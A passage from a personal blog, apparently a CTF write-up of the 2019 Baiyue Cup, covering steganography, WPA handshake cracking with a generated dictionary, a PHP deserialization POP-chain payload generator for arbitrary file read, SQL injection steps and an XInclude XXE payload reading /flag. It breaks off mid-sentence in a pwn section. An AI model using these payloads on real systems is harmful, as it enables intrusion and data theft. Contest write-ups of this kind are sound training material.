<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>ccreaterのblog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="ccreaterのblog">
<meta property="og:url" content="https://site.ccreater.top/page/5/index.html">
<meta property="og:site_name" content="ccreaterのblog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ccreaterのblog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-byb2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/byb2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/byb2019/">百越杯2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p>
<p>base64decode </p>
<p><code>please submit: flag&#123;hello_byb&#125;</code></p>
<h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>下载附件,用photoshop放大查看,有一条奇奇怪怪的钥匙</p>
<p>用hxd打开图片在图片末尾找到KEY:ISEEU!</p>
<p>提取钥匙中特殊颜色的RGB值与key循环异或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2f3f24</span><br><span class="line">222e13</span><br><span class="line">7f6624</span><br><span class="line">713645</span><br><span class="line">7b7e27</span><br><span class="line">723310</span><br><span class="line">646721</span><br><span class="line">76670c</span><br><span class="line">703723</span><br><span class="line">727816</span><br><span class="line">7a6020</span><br><span class="line">213345</span><br><span class="line">7b3277</span><br><span class="line">74375c</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rgb=[<span class="string">&#x27;2f&#x27;</span>,<span class="string">&#x27;3f&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;2e&#x27;</span>,<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;7f&#x27;</span>,<span class="string">&#x27;66&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;71&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;7b&#x27;</span>,<span class="string">&#x27;7e&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;72&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;76&#x27;</span>,<span class="string">&#x27;67&#x27;</span>,<span class="string">&#x27;0c&#x27;</span>,<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;72&#x27;</span>,<span class="string">&#x27;78&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;7a&#x27;</span>,<span class="string">&#x27;60&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;33&#x27;</span> ,<span class="string">&#x27;45&#x27;</span>,<span class="string">&#x27;7b&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;77&#x27;</span>,<span class="string">&#x27;74&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;5c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">key=<span class="string">&quot;ISEEU!&quot;</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rgb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)^<span class="built_in">ord</span>(key[j])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    j%=<span class="number">6</span></span><br></pre></td></tr></table></figure>



<p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p>
<h3 id="哈尔的移动城堡"><a href="#哈尔的移动城堡" class="headerlink" title="哈尔的移动城堡"></a>哈尔的移动城堡</h3><p>下载附件得到ori.jpg和102%</p>
<p>用hxd打开后发现</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p>
<p>这是一张png图片但是文件头错了</p>
<p>划到最后面发现PK</p>
<p>图片里面又藏在压缩包,搜索IEND找到png的最后一个数据块(别问我为啥不用foremost,谁用谁知道)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p>
<p>又是一个魔改的文件头(正常zip文件头 504B0304 ),手动分离得到zip</p>
<p>emmmm需要密码</p>
<p>用stegsolve发现分离出来的png里藏着二维码</p>
<p>猜测做了蒙版处理</p>
<p>打开ps一段猛如虎()(自闭)的操作后,手动拼接出了二维码</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p>
<p>得到压缩包密码1tsEz_b14ndVV4t3rM4k</p>
<p>解压得到两张图片</p>
<p>用beyondcompare得到flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p>
<p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p>
<h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>下载得到readme和一个流量</p>
<p>readme</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知密码格式是6666xxxx</span><br></pre></td></tr></table></figure>

<p>原本试着生成一个所有可打印字符的密码,但是这个也要500m+</p>
<p>所以先用纯数字密码试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">4</span>):</span><br><span class="line">    f.write(<span class="string">&quot;6666%04d\n&quot;</span>%i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>用kali的<code>aircrack-ng</code> 来破解通信内容</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p>
<p>flag{0566668912-f059-448f}</p>
<p>幸亏没有直接爆所有可打印字符</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;瑙ｆ瀽寮€濮�&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;step1&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chal</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> Show(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>%100反序列化链构造</p>
<ol>
<li><p><code>Show::__wake</code>是唯一可以入手的地方</p>
</li>
<li><p>在这个方法中只有$this-&gt;source可以构造pop链的连接点</p>
</li>
</ol>
<p>阅读代码发现<code>Show::__toString</code>会被<code> if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>调用</p>
<ol start="3">
<li><code>Show::__toString</code>:  $this-&gt;str[‘str’]-&gt;source和<code>Test::__get</code>构成链接点</li>
<li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>和<code>Read::__invoke</code>构成链接点</li>
<li>而Read()可以任意读取文件</li>
</ol>
<p>payload生成:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;fllllllaaaaaag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>=<span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> Test;</span><br><span class="line"><span class="comment">//$s-&gt;str[&quot;str&quot;] = $t;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Read::__invoke</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">new</span> Read;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test::__get</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Show::__tostring</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(urlencode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>最后一步就剩flag的文件名,从正则中抠出<code>fllllllaaaaaag</code>但是直接读取,网页500,是文件不存在的结果</p>
<p>一番尝试后flag的文件名<code>fllllllaaaaaag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;df210681-fb10-4c0f-ba25-1f678eb38f85&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>文件树</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.html</span><br><span class="line">tools.php?hash=</span><br><span class="line">manage.php?showuer</span><br><span class="line">			register</span><br><span class="line">			login</span><br><span class="line">			msgid=1</span><br><span class="line">			</span><br></pre></td></tr></table></figure>



<p>index.html</p>
<p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p>
<p>flag生成方式</p>
<p><code> flag&#123;md5(name . md5(pass))&#125;</code></p>
<p>网站存在两个cookie: __jsluid_h , PHPSESSID </p>
<p>约束攻击生效,但是无法拿到flag</p>
<p>二次注入测试逃逸引号</p>
<p>宽字节x=&gt;正常回显</p>
<p>%00x=&gt;\0</p>
<p>出现需要转义的地方没有假flag</p>
<p><code>a&#39;#</code>没有flag</p>
<p><code>a\&#39;#</code>出现flag,md5为<code>flag&#123;md5(&quot;a\\\&#39;&quot; . md5(pass))&#125;</code></p>
<p>而直接<code>b\&#39;#</code>是没有flag的,而且与#无关</p>
<p>判断用户时候存在再给一个flag链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a\\\&#x27;#=&gt;a\&#x27;#=&gt;select * from xx where user=&#x27;$user&#x27;?</span><br><span class="line"></span><br><span class="line">a\&#x27;=&gt;a&#x27;,用户不存在</span><br><span class="line"></span><br><span class="line">猜测</span><br></pre></td></tr></table></figure>

<p><code>c\&#39;#</code>=&gt;no flag</p>
<p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>出现flag(得删除cookie)</p>
<p>注入点就在这</p>
<p>什么代码导致这种结果</p>
<p>登陆时:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p>
<p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user	php($_SESSION) mysql(&#x27;$sql&#x27;)</span><br><span class="line">a&#x27;		a&#x27; 			a&#x27;</span><br><span class="line">a\&#x27;		a\&#x27; 		a\&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在过滤?</p>
<p>依据个数生成flag链接</p>
<p>后面想到为啥注入点不可以是msgid呢</p>
<p>约束攻击获得一个只带有<code>\</code>的账号</p>
<p>注册一个a+’ ‘*28+’”‘ 的账号</p>
<p>msgid处出现注入点</p>
<p><code>or 1%23</code>成功</p>
<p>用sqlmap爆破得到admin的密码拿到tools.php解密得到:<code> ChunQiuGame</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p>
<p>正常的xxe没啥用,找到一叶飘零的一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156227">https://www.anquanke.com/post/id/156227</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line"> &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p>
<p>………………..气死了就差一点拿到flag</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.tw原题魔改，<code>bss</code>没有<code>stdin</code>,<code>stdout</code>,<code>stderr</code>了，但是一开始有个询问姓名，不知道有什么用,后来试了各种方法，想到了把<code>stdout</code>的<code>fileno</code>改为<code>2</code>，就可以绕过<code>close(1)</code>了<br>而且刚好</p>
